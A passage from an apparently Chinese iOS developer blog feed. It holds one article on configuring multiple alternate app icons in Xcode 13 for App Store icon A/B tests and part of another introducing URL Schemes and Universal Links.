    <content type="html"><![CDATA[<p>本文首发于 <a href="https://juejin.cn/post/7044748618078617613">Xcode 配置多套 App 图标的方法 — AppStore 图标 A/B Test 实践 - 掘金</a>，欢迎关注我们 <a href="https://juejin.cn/user/1002387318511214">@37手游iOS技术运营团队</a> 。</p><span id="more"></span><p>作者：iHTCboy</p><blockquote><p>最近苹果推出 App Store 产品页的新功能，其中在 app 产品页的不同版本上使用不同的图标，通过  A/B Test 找出效果最佳的版本。但是苹果文档并没有给出详细的教程，怎么在 Xcode 中集成多套图标呢？这就是本文要讲解的内容，适合 iOS 技术开发同学阅读。</p></blockquote><h3 id="一、背景"><a href="#一、背景" class="headerlink" title="一、背景"></a>一、背景</h3><p>2021 年 12 月 08 日，苹果 <a href="https://developer.apple.com/cn/news/?id=2xnhx92t">推出 App Store 产品页的新功能</a>，在 App Store 中开发者可以针对 app 产品页的不同版本上使用不同的图标、截屏和 app 预览，通过  A/B Test 找出效果最佳的版本。有部分读取可能知道我们在之前的文章 <a href="https://juejin.cn/post/6986478834040209445#heading-4">解读 AppStore 新功能：自定义产品页面和 A/B Test 工具</a>，当时留下这个一个问题：<strong>测试不同的 app 图标，提交新图标的 app 审核流程是怎么样？</strong></p><p>在 <a href="https://developer.apple.com/videos/play/wwdc2021/10295">Get ready to optimize your App Store product page - WWDC21</a> 视频中有这样一段话：</p><blockquote><p>And remember, to test a variation of your app icon, you’ll need to include the icon assets in the binary of your app version that is currently live, so make sure to prepare your app releases accordingly.<br>请记住，要测试 app 图标的变体，您需要将图标集包含在当前上线的 app 版本的二进制文件中，因此请确保相应地准备应用版本。</p></blockquote><h4 id="1-1-Xcode-集成多套测试-App-图标"><a href="#1-1-Xcode-集成多套测试-App-图标" class="headerlink" title="1.1 Xcode 集成多套测试 App 图标"></a>1.1 Xcode 集成多套测试 App 图标</h4><p>怎么包含不同的图标集到 app 中呢？首先，想到的是 Xcode 13 beta 版本，然后在苹果的文档 <a href="https://developer.apple.com/documentation/Xcode-Release-Notes/xcode-13-beta-release-notes">Xcode 13 Beta 3 Release Notes | Apple Developer Documentation</a> 中找到这样一段话：</p><blockquote><p><strong>Asset Catalogs</strong></p><p><strong>New Features</strong></p><p>At runtime, your app can now use iOS app icon assets from its asset catalog as alternate app icons. A new build setting, “Include all app icon assets,” controls whether Xcode includes all app icon sets in the built product. When the setting is disabled, Xcode includes the primary app icon, along with the icons specified in the new setting, “Alternate app icon sets.” The asset catalog compiler inserts the appropriate content into the Info.plist of the built product. (33600923)<br>在运行时，您的 app 现在可以使用其资产目录中的 iOS app 图标资产作为备用 app 图标。新的构建设置“包括所有 app 图标资产”控制 Xcode 是否包含构建产品中的所有 app 图标集。当该设置被禁用时，Xcode 包括主 app 图标，以及在新设置“备用 app 图标集”中指定的图标。资产目录编译器将适当的内容插入到构建产品的 Info.plist 中。 (33600923)</p></blockquote><p>先说结论：实现多套App图标集成，是要依赖 <strong>Xcode 13</strong>! <strong>Xcode 13</strong>! <strong>Xcode 13</strong>!</p><h3 id="二、正文"><a href="#二、正文" class="headerlink" title="二、正文"></a>二、正文</h3><p>在 Xcode 13 之前，如果要实现 iOS App 动态切换图标，需要在 Info.plist 中添加 <code>CFBundleAlternatelcons</code> 相关字段来声明对应的备用图标。如果要多套 App 图标，那么需要添加很多标签，不够直观和高效。</p><p>所以，在 Xcode 13 开始，可能通过项目的 <code>Assets.xcassets</code> 里创建 AppIcon 图标模板的形式，直观又方便管理图标。</p><h4 id="2-1-如何添加多套-App-图标"><a href="#2-1-如何添加多套-App-图标" class="headerlink" title="2.1 如何添加多套 App 图标"></a>2.1 如何添加多套 App 图标</h4><p>首先，我们直接来说一下怎么做，其实也不复杂。最后文章，在来总结一下注意事项。</p><p><img src="https://p6-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/c1a7317f7e6a4460ae4e0f5e5b0767d0~tplv-k3u1fbpfcp-watermark.image" alt="Xcode13-Alternatelcons-1.jpg"></p><p>跟添加 App 图标一样，把所有需要的图标集都添加到 <code>Assets.xcassets</code> 中就可以。</p><p>然后将 <code>Include all app icon assets</code> 改为 <code>YES</code>。（注意，需要 Xcode 13 以上才有这个字段！）</p><p><img src="https://p9-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/8519cb04254c40d5a756100305cdc79d~tplv-k3u1fbpfcp-watermark.image" alt="Xcode13-Alternatelcons-2.jpg"></p><blockquote><p>选项 <code>Include all app icon assets</code> 配置的作用是打包时决定 Asset Catalogs 编译器要不要把所有的备用图标也编译到 asset 集中。</p></blockquote><p>所以，简单来总结：</p><ol><li>使用 Xcode 13 </li><li>在 <code>Assets.xcassets</code> 创建多套测试的图标，并添加对应的图标</li><li>在 <code>Include all app icon assets</code> 设置为 <code>YSE</code> </li></ol><h4 id="2-2-原理分析解答"><a href="#2-2-原理分析解答" class="headerlink" title="2.2 原理分析解答"></a>2.2 原理分析解答</h4><h5 id="如何验证多套图标是否添加成功"><a href="#如何验证多套图标是否添加成功" class="headerlink" title="如何验证多套图标是否添加成功"></a>如何验证多套图标是否添加成功</h5><p>要验证是否成功，就要知道 Xcode 做了什么。将<code>Include all app icon assets</code> 改为 <code>YES</code>，Xcode 做了几件事：</p><ul><li>把每套 icon 的 60x60@2x 和 60x60@3x 两张 iOS App 图标打包到 <code>Assets.car</code> 文件中</li><li>把每套 icon 的 60x60@2x 和 60x60@3x 两张 iOS App 图标放到包体目录中</li><li>在 Info.plist 的 <code>CFBundleAlternateIcons</code>  字段下添加备用图标为名字的 key-value</li></ul><p>所以，从这 3 个方面可以验证。</p><p>打包后，可以查看包体下的 Info.plist 文件下 Icon files (iOS 5) 配置下是否有 <code>CFBundleAlternateIcons</code> 对应的多套图标的名字：</p><p><img src="https://p6-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/243413abaedf447a9fd7348410159831~tplv-k3u1fbpfcp-watermark.image" alt="Xcode13-Alternatelcons-3.jpg"></p><p>查看 <code>Assets.car</code> 文件里的是否包含图标也可以验证，这里就不重复了。</p><h5 id="只使用部分备用的图标"><a href="#只使用部分备用的图标" class="headerlink" title="只使用部分备用的图标"></a>只使用部分备用的图标</h5><p>可以通过 <code>Alternate App Icon Sets</code> 设置只使用的备份图标。前提条件时，<code>Include all app icon assets</code> 要设置为 <code>NO</code>.</p><p><img src="https://p3-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/8b344d5ef8e8403abc729599a3caa0ed~tplv-k3u1fbpfcp-watermark.image" alt="Xcode13-Alternatelcons-4.jpg"></p><p>通过上图，就可以指定只设置 3 套备用图标。<strong>需要特别注意：</strong></p><ul><li>填写的图标集名字，一定要与 <code>Assets.car</code> 里的名字一致</li><li>如果填写了错误或者不存在的名字，Xcode 会忽视并且不会报错</li></ul><p>所以，可以通过上面说到的验证方法确定名字没有填写错。</p><blockquote><p>注：当 <code>Include all app icon assets</code> 要设置为 <code>YSE</code> 时，Xcode 会忽视 <code>Alternate App Icon Sets</code> 设置的内容。</p></blockquote><h5 id="不要用有透明的图标"><a href="#不要用有透明的图标" class="headerlink" title="不要用有透明的图标"></a>不要用有透明的图标</h5><p><img src="https://p6-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/f6557cd308dd47889912573b928a4d3b~tplv-k3u1fbpfcp-watermark.image" alt="Xcode13-Alternatelcons-5.jpg"></p><p>如上图所示，使用有透明区域的图片，最终显示的图标，背景将会变成黑色：</p><p><img src="https://p6-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/5ff8dcaa312546da9d8b5eebe5edc43f~tplv-k3u1fbpfcp-watermark.image" alt="Xcode13-Alternatelcons-6.jpg"></p><h5 id="1024-图标不要用-JPG-格式"><a href="#1024-图标不要用-JPG-格式" class="headerlink" title="1024 图标不要用 JPG 格式"></a>1024 图标不要用 JPG 格式</h5><p>1024x1024 的商店图片，作为主图标时可以用jpg。如果用 png 格式，则不能有透明区域，否则上传 ipa 包体时会报错，无法上报。</p><p><img src="https://p6-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/9c542d4f97bc4e3e88e244c6f199e18c~tplv-k3u1fbpfcp-watermark.image" alt="Xcode13-Alternatelcons-7.jpg"></p><p>而备用的图标，则 <strong>不能使用 jpg！</strong> 不能使用 jpg！不能使用 jpg！</p><p>上报时会报错：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Dear</span> Developer,</span><br><span class="line"></span><br><span class="line"><span class="attribute">We</span> identified one or more issues with a recent delivery for your app, <span class="string">&quot;斗罗大陆：魂师对决&quot;</span> <span class="number">2</span>.<span class="number">3</span>.<span class="number">1</span> (<span class="number">2</span>.<span class="number">3</span>.<span class="number">1</span>). Please correct the following issues, then upload again.</span><br><span class="line"></span><br><span class="line"><span class="attribute">ITMS</span>-<span class="number">90033</span>: Invalid Image - - Image found at the path &#x27;TestAIcon-<span class="number">1</span>x~marketing-<span class="number">0</span>-<span class="number">7</span>-<span class="number">0</span>-<span class="number">85</span>-<span class="number">220</span>.jpeg&#x27; referenced under key &#x27;CFBundleAlternateIcons&#x27; is not a valid PNG file</span><br></pre></td></tr></table></figure><p>所以，备用图标的 1024x1024 一定要用 PNG 格式！</p><h5 id="代码进行图标切换"><a href="#代码进行图标切换" class="headerlink" title="代码进行图标切换"></a>代码进行图标切换</h5><p>最后，因为已经配图和验证了备用图片已经生效，那么也可以用代码来调用，切换备用图标测试：</p><p>设置某个备用图标时，传入图标集的名字就可以，一句代码：</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="module-access"><span class="module"><span class="identifier">UIApplication</span>.</span></span>shared.set<span class="constructor">AlternateIconName(<span class="string">&quot;Rainbow&quot;</span>)</span></span><br></pre></td></tr></table></figure><p>设置回默认图标的代码：</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="module-access"><span class="module"><span class="identifier">UIApplication</span>.</span></span>shared.set<span class="constructor">AlternateIconName(<span class="params">nil</span>)</span></span><br></pre></td></tr></table></figure><p>最后，我们将以上配置示例，上传到 GitHub 上，提供了 ObjC、Swift、SwiftUI 的版本，大家可以参考。</p><ul><li><a href="https://github.com/37iOS/Assets-Alternate-App-Icons">37iOS/Assets-Alternate-App-Icons - GitHub</a></li></ul><p><img src="https://p9-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/7a5c67408f51440ab1d5a0875f884892~tplv-k3u1fbpfcp-watermark.image" alt="Xcode13-Alternatelcons-8.jpg"></p><h5 id="更灵活的配置"><a href="#更灵活的配置" class="headerlink" title="更灵活的配置"></a>更灵活的配置</h5><p><code>Include all app icon assets</code> 在 Xcode 的对应 buildSettings 的名字是  <code>ASSETCATALOG_COMPILER_INCLUDE_ALL_APPICON_ASSETS</code>，而 <code>Alternate App Icon Sets</code> 对应的字段是 <code>ASSETCATALOG_COMPILER_ALTERNATE_APPICON_NAMES</code>。还有一个设置 App 主图标的字段 <code>Primary App Icon Set Name</code> 对应是 <code>ASSETCATALOG_COMPILER_APPICON_NAME</code>。</p><p>其实这些字段，在 Xcode 13 有映射成了 GUI 界面：</p><p><img src="https://p6-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/7c0639a035984963b8e631939e1ae9e2~tplv-k3u1fbpfcp-watermark.image" alt="Xcode13-Alternatelcons-9.jpg"></p><p>这有什么好处？通过多套图标测试后的数据，可能需要使用某个备用图标设为主图标，通过 <code>General</code> 面板上，可以快速把备用的图标集改成主图标。</p><h5 id="苹果后台的配置"><a href="#苹果后台的配置" class="headerlink" title="苹果后台的配置"></a>苹果后台的配置</h5><p>需要注意，包含多套图标的包，需要按包体送审的流程过审后，才能在苹果后台 <code>产品页优化</code> 标签下看到多套图标，<code>App Icon</code> 分标签下：</p><p><img src="https://p1-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/47ece3b8b44149c1bba0610f5db9d58d~tplv-k3u1fbpfcp-watermark.image" alt="Xcode13-Alternatelcons-10.png"></p><p>具体，如果配置多套图标的测试方案，可以参考苹果文档：<a href="https://help.apple.com/app-store-connect/#/devb53f12312">配置处理方案 - App Store Connect 帮助</a>。这里就不展开了。</p><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>Xcode 13 支持通过 <code>Assets.xcassets</code> 配置多套备用图标，减少了开发者以前繁琐的配置，提升开发体验，希望后续有更多开发者来尝试，多套图标能一定程度上满足用户的自定义需求。</p><p>对多套 App 素材进行 A/B 测试，找出效果最佳的素材，是一个优秀的产品迭代优化的手段。大家都可以马上尝试一下，<code>找出最具吸引力的版本</code>，更吸引更高效的 App Store 产品页！</p><p>最后，我们现在参加《2021年度掘金人气团队榜》，希望大家可以给我们加油打气！鼓励我们2022年在创新篇~ </p><ul><li>加油打气入口：<a href="https://rank.juejin.cn/rank/2021/1002387318511214">投票链接</a></li><li>加油打气入口：<a href="https://rank.juejin.cn/rank/2021/1002387318511214">投票链接</a></li><li>加油打气入口：<a href="https://rank.juejin.cn/rank/2021/1002387318511214">投票链接</a></li></ul><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul><li><a href="https://juejin.cn/post/6986478834040209445">解读 AppStore 新功能：自定义产品页面和 A/B Test 工具</a></li><li><a href="https://developer.apple.com/cn/news/?id=2xnhx92t">现已推出 App Store 产品页的新功能 - 新闻 - Apple Developer</a></li><li><a href="https://developer.apple.com/videos/play/wwdc2021/10295">Get ready to optimize your App Store product page - WWDC21</a></li><li><a href="https://developer.apple.com/documentation/Xcode-Release-Notes/xcode-13-beta-release-notes">Xcode 13 Beta 3 Release Notes | Apple Developer Documentation</a> </li><li><a href="https://www.hackingwithswift.com/example-code/uikit/how-to-change-your-app-icon-dynamically-with-setalternateiconname">How to change your app icon dynamically with setAlternateIconName()</a></li><li><a href="https://katzenbaer.medium.com/alternate-app-icons-using-asset-catalogs-in-xcode-13-da6387d1cd78">Alternate App Icons using Asset Catalogs in Xcode 13| Medium</a></li><li><a href="https://iosexample.com/simple-alternate-app-icons-with-xcode-13-and-swiftui/">Simple alternate app icons with Xcode 13 and SwiftUI</a></li><li><a href="https://github.com/jknlsn/XCode13-Alternate-App-Icons">jknlsn/XCode13-Alternate-App-Icons</a></li><li><a href="https://help.apple.com/app-store-connect/#/devb53f12312">配置处理方案 - App Store Connect 帮助</a></li><li><a href="https://developer.apple.com/app-store/product-page-optimization/">Product Page Optimization - App Store - Apple Developer</a></li><li><a href="https://github.com/37iOS/Assets-Alternate-App-Icons">37iOS/Assets-Alternate-App-Icons - GitHub</a></li></ul>]]></content>
    
    
    <summary type="html">&lt;p&gt;本文首发于 &lt;a href=&quot;https://juejin.cn/post/7044748618078617613&quot;&gt;Xcode 配置多套 App 图标的方法 — AppStore 图标 A/B Test 实践 - 掘金&lt;/a&gt;，欢迎关注我们 &lt;a href=&quot;https://juejin.cn/user/1002387318511214&quot;&gt;@37手游iOS技术运营团队&lt;/a&gt; 。&lt;/p&gt;</summary>
    
    
    
    <category term="technology" scheme="https://ihtcboy.com/categories/technology/"/>
    
    
    <category term="Xcode" scheme="https://ihtcboy.com/tags/Xcode/"/>
    
    <category term="Alternate app icon" scheme="https://ihtcboy.com/tags/Alternate-app-icon/"/>
    
    <category term="Asset icon" scheme="https://ihtcboy.com/tags/Asset-icon/"/>
    
  </entry>
  
  <entry>
    <title>趣谈 iOS Universal Link</title>
    <link href="https://ihtcboy.com/2021/12/13/2021-12-13_%E8%B6%A3%E8%B0%88iOSUniversalLink/"/>
    <id>https://ihtcboy.com/2021/12/13/2021-12-13_%E8%B6%A3%E8%B0%88iOSUniversalLink/</id>
    <published>2021-12-13T07:52:16.000Z</published>
    <updated>2022-02-13T12:56:23.390Z</updated>
    
    <content type="html"><![CDATA[<p>本文首发于 <a href="https://juejin.cn/post/7041091910626181157">趣谈 iOS Universal Link - 掘金</a>，欢迎关注我们 <a href="https://juejin.cn/user/1002387318511214">@37手游iOS技术运营团队</a> 。</p><span id="more"></span><p>作者：iHTCboy</p><blockquote><p>本文对 iOS Universal Link（通用链接）的浅入浅出介绍，从产品的角度来了解其发展历程。</p><p>1、了解 Universal Link 背后的故事</p><p>2、学习 Universal Link 功能的使用</p><p>3、总结 Universal Link 产品的思考</p></blockquote><h3 id="一、前言"><a href="#一、前言" class="headerlink" title="一、前言"></a>一、前言</h3><p>说起 Universal Link（通用链接），对于有过 iOS 开发的同学，一定有用上过。目前在申请微信分享或登陆时，需要配置 Universal Link 链接。对于 Universal Link，大家应该都了解：</p><ul><li>苹果 WWDC 2015 提出的 iOS 9 的新功能。 </li><li>方便地通过打开一个 https 链接来直接启动 App (手机有安装 App 的情况下)。</li><li>实现 web-app 的无缝链接时，能够提供极佳的用户体验。</li></ul><p>但是，反过来说，<strong>为什么需要 Universal Link ?</strong> 这就是本文想要趣谈的一个内容。以下内容，是基于之前在团队分享的内容整理而成。</p><h3 id="二、为什么需要-Universal-Link"><a href="#二、为什么需要-Universal-Link" class="headerlink" title="二、为什么需要 Universal Link ?"></a>二、为什么需要 Universal Link ?</h3><p>我们知道一个新事物的出现，肯定不是凭空出现，同理，Universal Link 的出现，肯定是基于某个原因或者基础而产生。所以，Universal Link 基于 <code>Scheme</code> 基础上而提出来的。</p><h4 id="URL-Scheme"><a href="#URL-Scheme" class="headerlink" title="URL Scheme"></a>URL Scheme</h4><p>URL Scheme 一般用在在一个 App 里跳转到另一个 App，属于应用间的跳转。当然在浏览器(也可以理解为是 App) web 页面也可以通过 <code>scheme://</code> 跳转到 App，但是这种方式在每次跳转的时候都会弹框询问，如果设备中没有安装此 App 则会直接弹出错误提示，体验不友好。大家对以下 scheme 应该不会陌生：</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">scheme://</span><br><span class="line"></span><br><span class="line">weixin://dl/moments（朋友圈）</span><br><span class="line">weixin://scanqrcode（微信扫码） </span><br><span class="line">alipayqr://platformapi/startapp?saId=10000007（支付宝扫码） </span><br><span class="line">shoebox:// （Apple Pay）</span><br></pre></td></tr></table></figure><h5 id="为什么会出现-URL-Scheme-？"><a href="#为什么会出现-URL-Scheme-？" class="headerlink" title="为什么会出现 URL Scheme ？"></a>为什么会出现 URL Scheme ？</h5><p>那么，另一个问题又来了，<strong>为什么会出现 URL Scheme ？</strong></p><p><img src="https://p3-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/30b4fb52b2894d2299007f3e4ad2892f~tplv-k3u1fbpfcp-watermark.image" alt="iOSUniversalLink-6.jpeg"></p><p>在当年 iPhoneOS 出来时，就已经是有沙盒机制，导致二个 App 之间无法读取对方的沙盒空间，无法直接通讯，所以，苹果提供了 <code>Apple URL Scheme Reference</code> 来解决自家的 app 无法交互的问题。</p><p>举例来说，在 Safari 浏览器看到某个网页上的电话号码，能不能直接调起拨打电话？我们知道可以这样编码：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">HTML link:</span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;tel:1-408-555-5555&quot;</span>&gt;</span>1-408-555-5555<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"></span><br><span class="line">Native app URL string:</span><br><span class="line">tel:1-408-555-5555</span><br></pre></td></tr></table></figure><p><img src="https://p1-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/7cf94fa957cd497c8c7af432c2c9b016~tplv-k3u1fbpfcp-watermark.image" alt="iOSUniversalLink-7.jpeg"></p><p>可以看苹果的文档看到，URL Schemes 是跟 iPhoneOS 开放给开发者，详细的苹果 URL Schemes 可以文档：<a href="https://developer.apple.com/library/archive/featuredarticles/iPhoneURLScheme_Reference/Introduction/Introduction.html#//apple_ref/doc/uid/TP40007899-CH1-SW1">About Apple URL Schemes</a>。</p><p><img src="https://p1-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/cca4940f040b4722bd7e3ec743113591~tplv-k3u1fbpfcp-watermark.image" alt="iOSUniversalLink-9.jpeg"></p><p>使用 URL Schemes 最多的 App 应该是效率工具类，因为它们有工作流的需求，所以它们把 URL Schemes 玩出了很多花样，包含 <code>callback-URL</code> 回调功能。</p><h5 id="Scheme-缺点是什么"><a href="#Scheme-缺点是什么" class="headerlink" title="Scheme 缺点是什么 ?"></a>Scheme 缺点是什么 ?</h5><p>出现 Universal Link，那么说明 URL Schemes 有什么不足呢？那可以反过来说，Universal Link 有什么优点呢？ </p><h4 id="Universal-Link-优点"><a href="#Universal-Link-优点" class="headerlink" title="Universal Link 优点"></a>Universal Link 优点</h4><p>Universal Link 优点，主要有 4 个：</p><ol><li>通用性</li><li>灵活性</li><li>安全性 </li><li>隐私性</li></ol><p><img src="https://p6-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/153642d338fd408ca03e29fe7ad562fb~tplv-k3u1fbpfcp-watermark.image" alt="iOSUniversalLink-13.jpeg"></p><p><strong>通用性</strong>：一个 URL 对你的网站和 App 都通用，Universal Links 是标准的 URL 格式，而自定义 URL Scheme 可能理解为特殊 URL 方案，默认只有你的 App 能解析，浏览器无法解析。</p><p><img src="https://p3-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/2def6845ab4d486393cb2bc5d706d077~tplv-k3u1fbpfcp-watermark.image" alt="iOSUniversalLink-15.jpeg"></p><p><strong>灵活性</strong>：即使未安装你的 App，Universal Links 也可以使用。未安装你的应用程序时，打开链接，Safari 中打开显示你网站的内容，是符合用户预期的体验，同时，网页可以显示跳转 AppStore 下载的引导，进一步的提升用户体验。</p><p><img src="https://p3-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/2b5fb1cca1ae49a48f09729021a2b02f~tplv-k3u1fbpfcp-watermark.image" alt="iOSUniversalLink-14.jpeg"></p><p><strong>安全性</strong>：只有开发者自己的网络域名配置了 apple-app-site-association，才能调用对应的 App。而 URL Scheme 配置的 Scheme，任意的 App 都可以配置相同的 Scheme，无法保证开发者 App 的安全调用。另外，当用户安装你的 App 时，iOS 会检查你已上传到网络服务器的文件配置，以确保只有你的网站允许调用您的 App。</p><p><img src="https://p9-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/6864fb333af542b7bb6ec6e052e7b98f~tplv-k3u1fbpfcp-watermark.image" alt="iOSUniversalLink-16.jpeg"></p><p><strong>隐私性</strong>：很久以前，大家都可以利用 Scheme 检查 App 是否安装，这样有什么作用呢？其实，当你知道用户都安装了什么应用后，可以分析用户的喜好或习惯，当然，目前。另一方面，很多 App 会冒充注册知名的 App scheme 从而拦截调合法 App 的 scheme 调起。</p><blockquote><p>注：iOS 9 开始苹果把 URL Schemes 改为白名单机制，也就是只有配置了白名单的 scheme 才可正常检查其他应用是否安装。同时，最多只能设置 50 个不同的 Schemes 白名单（超出 50 个的 schemes 调用 canOpenURL 返回 NO）。</p></blockquote><p><img src="https://p1-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/11c2c960915b4bde8c2796fd4990af23~tplv-k3u1fbpfcp-watermark.image" alt="iOSUniversalLink-17.jpeg"></p><p>另外，微信创建应用时，必须配置 Universal Link 链接，详细见文档：<a href="https://developers.weixin.qq.com/community/develop/doc/00062412e00e4878f8290f35457801">微信开放平台发布新版本SDK，请开发者尽快更新</a>。从安全性和隐私性来说，微信是做的最好和最前卫，连海外 Facebook、Google 的 SDK 现在都还没有提出 Universal Link 的想法。</p><h4 id="Universal-Link-配置"><a href="#Universal-Link-配置" class="headerlink" title="Universal Link 配置"></a>Universal Link 配置</h4><ul><li>只支持 iOS 9+</li><li>拥有一个域名</li><li>通过 SSL 访问域名(即支持HTTPS)</li><li>上传一个 JSON 文件到域名下(名为 <code>apple-app-site-association</code> 的json格式文件) </li></ul><p>关于 Universal Link 的配置，网上已经有很多教程，这里就不再赘述了。具体可以教程官方文档： <a href="https://developer.apple.com/library/archive/documentation/General/Conceptual/AppSearch/UniversalLinks.html#//apple_ref/doc/uid/TP40016308-CH12-SW1">Support Universal Links</a>、<a href="https://developer.apple.com/documentation/xcode/supporting-universal-links-in-your-app">Supporting Universal Links in Your App</a>。</p><p><img src="https://p1-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/5a7c55f0bd584537b12cb38cad99b920~tplv-k3u1fbpfcp-watermark.image" alt="iOSUniversalLink-19.jpeg"></p><p><img src="https://p9-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/2d76277e59d744b4a49e7db766e8e0b6~tplv-k3u1fbpfcp-watermark.image" alt="iOSUniversalLink-20.jpeg"></p><p><img src="https://p3-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/9ad23c0b18d64e5c8bd41004c9b0d546~tplv-k3u1fbpfcp-watermark.image" alt="iOSUniversalLink-21.jpeg"></p><p><img src="https://p1-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/299842f4aa7d4f81a6a674454fffdcfb~tplv-k3u1fbpfcp-watermark.image" alt="iOSUniversalLink-22.jpeg"></p><h4 id="Universal-Link-坑点"><a href="#Universal-Link-坑点" class="headerlink" title="Universal Link 坑点"></a>Universal Link 坑点</h4><p>虽然苹果提供 <a href="https://search.developer.apple.com/appsearch-validation-tool/">https://search.developer.apple.com/appsearch-validation-tool/</a> 网页让开发者检查 Universal Link 配置是否正常，但是检查不正常的链接，Universal Link 可能是正常的。最大的坑就是必须要跨域，比如配置 Universal Link 链接为：<code>https://applink.app.com</code>，那么不能直接在页面中调用此链接来唤起 App，必然是其它二级域名，所以，一般 Universal Link 配置链接是用一个单独的二级域名，与业务域名分开。</p><p>最后，最常用的检查配置是否正常的方式有2个：<br><img src="https://p1-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/8b01daa0858d46b296205925101165c3~tplv-k3u1fbpfcp-watermark.image" alt="iOSUniversalLink-25.jpeg"></p><h4 id="Universal-Link-特性回顾"><a href="#Universal-Link-特性回顾" class="headerlink" title="Universal Link 特性回顾"></a>Universal Link 特性回顾</h4><p>最后，回顾一下，Universal Link 这几年以来的新特性。</p><p><img src="https://p6-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/52f8ba067f6b42db85a40cb48676fcbe~tplv-k3u1fbpfcp-watermark.image" alt="iOSUniversalLink-26.jpeg"><br>在 2015 年 iOS 9 推出 Universal Link 功能，在 2017 年在 tvOS 端推出。</p><p><img src="https://p1-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/3ac40f994b0b4d17a07b3002fea8191d~tplv-k3u1fbpfcp-watermark.image" alt="iOSUniversalLink-27.jpeg"><br>直到 2019年，支持精细化地址匹配，可以多个 App 共用一套配置、路径等。</p><p><img src="https://p9-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/deeff3624a054cfa92e44e9ea563d462~tplv-k3u1fbpfcp-watermark.image" alt="iOSUniversalLink-28.jpeg"><br>举例来说，可以通配符匹配。</p><ul><li><code>*</code>：星号匹配 0 个或多个字符，并且贪婪地匹配。它将匹配尽可能多的字符。</li><li><code>?</code>：问号匹配一个字符。</li><li><code>?*</code>：要匹配至少一个字符，请使用问号，后跟星号。</li></ul><p><img src="https://p3-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/c76ca41cbe514975a67231b4e7c11aef~tplv-k3u1fbpfcp-watermark.image" alt="iOSUniversalLink-29.jpeg"></p><p>支持 macOS 10.15 以上，需要注意，Mac 的 App，如果是从 Mac AppStore 下载的 App，默认Universal Link 已经生效，而开发者自己分发的 App 则至少需要打开一次之后才能生效。</p><p><img src="https://p3-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/38ee9fcc96864be68d15cdf57f3a89cb~tplv-k3u1fbpfcp-watermark.image" alt="iOSUniversalLink-30.jpeg"><br>2020 年，苹果发布了 SwiftUI，跨平台开发的 UI 框架（支持 iOS、macOS、tvOS、watchOS），所以，如果自然的也要支持 watchOS 啦。需要注意的是，如果 Universal Link 无效，则 watchOS      不能处理，会提示错误信息。因为虽然从 watchOS 5 开始支持 WebKit，但至今 watchOS 还没有内置 Safari 浏览器。哈哈，不知道大家是否期待支持~</p><p><img src="https://p3-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/c4156937cc3942219eab2f921031956f~tplv-k3u1fbpfcp-watermark.image" alt="iOSUniversalLink-31.jpeg"><br>同时，支持大小写忽略的模式匹配，通过配置 <code>&quot;caseSensitive&quot;: false</code>，来取消大小写敏感。解决前端不同页面或者大小写的问题。</p><p><img src="https://p6-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/e80f31f98f7d4c47ba2b19b29ab3b024~tplv-k3u1fbpfcp-watermark.image" alt="iOSUniversalLink-32.jpeg"><br>Unicode 模式的支持，比如中文 <code>蚂蚁上树</code>，默认情况下需要 ulr encode 才能读取。通过 <code>&quot;percentEncoded&quot;: false</code> 这样用什么语言都直接显示，方便显示和维护，也减少了链接长度。</p><p><img src="https://p3-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/2283bd2fb1ed45f1b94d0638dbde952c~tplv-k3u1fbpfcp-watermark.image" alt="iOSUniversalLink-33.jpeg"><br>最后一个重点功能，替代变量的支持，比如 App 在多国家地区出售不同产品，那么可能某个国家或地区不销售某个产品，放在以前就需要写一堆的<code> /en_US/</code>、 <code>/fr_CA/</code> 不能的语言地区标识。</p><p><img 